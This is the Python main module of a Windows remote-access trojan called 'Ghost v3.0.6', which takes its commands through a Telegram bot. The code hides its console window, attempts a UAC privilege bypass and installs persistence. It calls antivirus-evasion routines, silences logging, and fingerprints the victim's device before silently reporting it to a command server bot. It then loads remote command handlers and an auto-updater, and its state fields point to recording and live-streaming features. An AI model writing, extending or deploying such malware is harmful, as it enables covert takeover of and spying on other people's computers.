# main.py - v3.0.6 PRODUCTION CLIENT (NEW ARCHITECTURE)
"""
v3.0.6 Production Client:
- Client sends data to SERVER BOT (not ADMIN_ID)
- Server Bot manages devices and commands
- Admin controls via Server Bot
"""

import asyncio
import sys
import logging
import ctypes
import os
import time
import random
from pathlib import Path

# ==================== AUTO INSTALLER (FIRST!) ====================
try:
    from auto_installer import ensure_dependencies
    if not ensure_dependencies():
        pass  # Silent fail - dependencies missing
        time.sleep(3)
        sys.exit(1)
except ImportError:
    pass  # Continue without auto-installer

# ==================== IMPORTS ====================
from telethon import TelegramClient
try:
    from telethon.errors import FloodWaitError, AuthKeyUnregisteredError, RPCError
    from telethon.errors.rpcerrorlist import NetworkMigrateError
except ImportError:
    FloodWaitError = Exception
    AuthKeyUnregisteredError = Exception
    RPCError = Exception
    NetworkMigrateError = Exception

# Connection error fallback
try:
    from telethon.errors import ConnectionError as TelegramConnectionError
except ImportError:
    TelegramConnectionError = ConnectionError

from config import (
    API_ID, API_HASH, BOT_TOKEN, ADMIN_ID, SERVER_BOT_ID,
    DEBUG_MODE, AUTO_UPDATE_ENABLED, SESSION_NAME,
    STEALTH_ENABLED, PERSISTENCE_ENABLED, ANTIVIRUS_EVASION,
    CURRENT_VERSION
)

# ==================== LOGGING ====================
if DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
else:
    logging.basicConfig(
        level=logging.CRITICAL,
        handlers=[logging.NullHandler()]
    )

logger = logging.getLogger(__name__)


# ==================== CLIENT CONTEXT ====================
class ClientContext:
    """
    Shared context for all handlers
    Replaces global variables
    """
    
    def __init__(self, admin_id: int):
        self.admin_id = admin_id
        self.user_state = {}  # Per-user state
        self.is_recording = False
        self.is_live = False
        self.selected_device = None
        self.version = CURRENT_VERSION
    
    def reset_state(self):
        """Reset all temporary state"""
        self.user_state = {}
        self.is_recording = False
        self.is_live = False


# Global context
ctx = ClientContext(ADMIN_ID)


# ==================== STEALTH FUNCTIONS ====================
def hide_console():
    """Hide console window"""
    if not STEALTH_ENABLED:
        return
    
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
            logger.debug("Console hidden")
    except Exception as e:
        logger.debug(f"Console hide error: {e}")


def check_admin() -> bool:
    """Check if running as admin"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


# ==================== SMART RECONNECT ====================
class SmartReconnect:
    """
    Exponential backoff reconnection handler
    Handles network failures gracefully
    """
    
    def __init__(self, 
                 base_delay: float = 1.0,
                 max_delay: float = 300.0,
                 max_retries: int = 5):
        self.base_delay = base_delay
        self.max_delay = max_delay
        self.max_retries = max_retries
        self.current_delay = base_delay
        self.retry_count = 0
    
    def reset(self):
        """Reset after successful connection"""
        self.current_delay = self.base_delay
        self.retry_count = 0
    
    async def wait(self):
        """Wait with exponential backoff"""
        if self.retry_count >= self.max_retries:
            raise Exception("Max retries exceeded")
        
        # Exponential backoff with jitter
        delay = min(
            self.current_delay * (2 ** self.retry_count) + random.uniform(0, 1),
            self.max_delay
        )
        
        self.retry_count += 1
        
        logger.debug(f"Reconnecting in {delay:.1f}s (attempt {self.retry_count})")
        await asyncio.sleep(delay)
        
        return True
    
    @property
    def should_retry(self) -> bool:
        return self.retry_count < self.max_retries


reconnect = SmartReconnect()


# ==================== MAIN FUNCTION ====================
async def run_client():
    """Main client loop with smart reconnect"""
    client = None
    
    try:
        # 1. Hide console
        if STEALTH_ENABLED:
            hide_console()
        
        # 2. UAC bypass (before persistence!)
        try:
            from uac_bypass import attempt_uac_bypass
            if not check_admin():
                logger.info("Attempting UAC bypass...")
                await attempt_uac_bypass()
        except ImportError:
            pass
        except Exception as e:
            logger.debug(f"UAC bypass error: {e}")
        
        # 3. Persistence
        if PERSISTENCE_ENABLED and getattr(sys, 'frozen', False):
            try:
                from persistence import ensure_persistence
                ensure_persistence()
            except Exception as e:
                logger.debug(f"Persistence error: {e}")
        
        # 4. Antivirus evasion
        if ANTIVIRUS_EVASION:
            try:
                from antivirus_evasion import evade_antivirus
                evade_antivirus()
            except ImportError:
                pass
            except Exception as e:
                logger.debug(f"AV evasion error: {e}")
        
        # 5. Create Telegram client
        logger.info("Starting Telegram client...")
        client = TelegramClient(
            SESSION_NAME, 
            API_ID, 
            API_HASH,
            connection_retries=5,
            retry_delay=1,
            auto_reconnect=True
        )
        
        await client.start(bot_token=BOT_TOKEN)
        
        # 6. Register handlers
        logger.info("Registering handlers...")
        
        # Try new modular handlers first
        try:
            from client_handlers import register_all_handlers
            register_all_handlers(client, ctx)
            logger.info("Modular handlers registered")
        except ImportError:
            # Fallback to old handlers
            from handlers import register_handlers
            register_handlers(client)
            logger.info("Legacy handlers registered")
        
        # 7. Initialize AI
        try:
            from ai_helper import initialize_ai_helper
            from config import AI_ENABLED, USE_OPENROUTER, OPENROUTER_API_KEY, GEMINI_API_KEY
            
            if AI_ENABLED:
                if USE_OPENROUTER and OPENROUTER_API_KEY:
                    initialize_ai_helper("openrouter", OPENROUTER_API_KEY)
                elif GEMINI_API_KEY:
                    initialize_ai_helper("gemini", GEMINI_API_KEY)
        except Exception as e:
            logger.debug(f"AI init error: {e}")
        
        # 8. Register device
        logger.info("Registering device...")
        from utils import register_device
        await register_device(client)
        
        # 9. Send minimal online notification
        try:
            # Get device ID from utils
            import hashlib
            import uuid
            import socket
            mac = uuid.getnode()
            mac_hash = hashlib.md5('{:012x}'.format(mac).encode()).hexdigest()[:6]
            hostname = socket.gethostname()[:10]
            device_id = f"{hostname}-{mac_hash}"
            
            await client.send_message(
                SERVER_BOT_ID,
                f"Yangi qurilma ulandi ID: {device_id}",
                silent=True
            )
        except Exception as e:
            logger.debug(f"Notification error: {e}")
        
        # 10. Auto-updater
        if AUTO_UPDATE_ENABLED:
            try:
                from auto_updater import start_auto_updater
                start_auto_updater(client)
            except Exception as e:
                logger.debug(f"Auto-update error: {e}")
        
        # Reset reconnect counter on success
        reconnect.reset()
        
        logger.info(f"Ghost v{CURRENT_VERSION} running")
        
        # Run until disconnected
        await client.run_until_disconnected()
        
    except FloodWaitError as e:
        logger.warning(f"Flood wait: {e.seconds}s")
        await asyncio.sleep(e.seconds)
        raise  # Retry after wait
        
    except AuthKeyUnregisteredError:
        logger.error("Auth key invalid - removing session")
        # Remove session file and retry
        session_file = Path(f"{SESSION_NAME}.session")
        if session_file.exists():
            session_file.unlink()
        raise
        
    except (ConnectionError, OSError) as e:
        logger.warning(f"Connection error: {e}")
        raise  # Will trigger reconnect
        
    except Exception as e:
        logger.error(f"Client error: {e}")
        raise
        
    finally:
        # Cleanup
        if client:
            try:
                await client.disconnect()
            except:
                pass
        
        # Cleanup utils executor
        try:
            from utils import cleanup
            cleanup()
        except:
            pass


async def main():
    """Main entry with smart reconnect loop"""
    
    while reconnect.should_retry:
        try:
            await run_client()
            # If client exits normally, break
            break
            
        except KeyboardInterrupt:
            logger.info("Stopped by user")
            break
            
        except Exception as e:
            logger.warning(f"Error: {e}, reconnecting...")
            
            try:
                await reconnect.wait()
            except Exception as re:
                logger.error(f"Reconnect failed: {re}")
                break
    
    logger.info("Client shutdown")


# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    # Platform check
    if sys.platform != "win32":
        pass  # Windows only - silent exit
        sys.exit(1)
    
    # Python version check
    if sys.version_info < (3, 7):
        pass  # Python 3.7+ required - silent exit
        sys.exit(1)
    
    # Hide console immediately
    if STEALTH_ENABLED:
        hide_console()
    
    # Suppress warnings
    try:
        import warnings
        warnings.filterwarnings("ignore")
    except:
        pass
    
    # Run
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        time.sleep(2)
        sys.exit(1)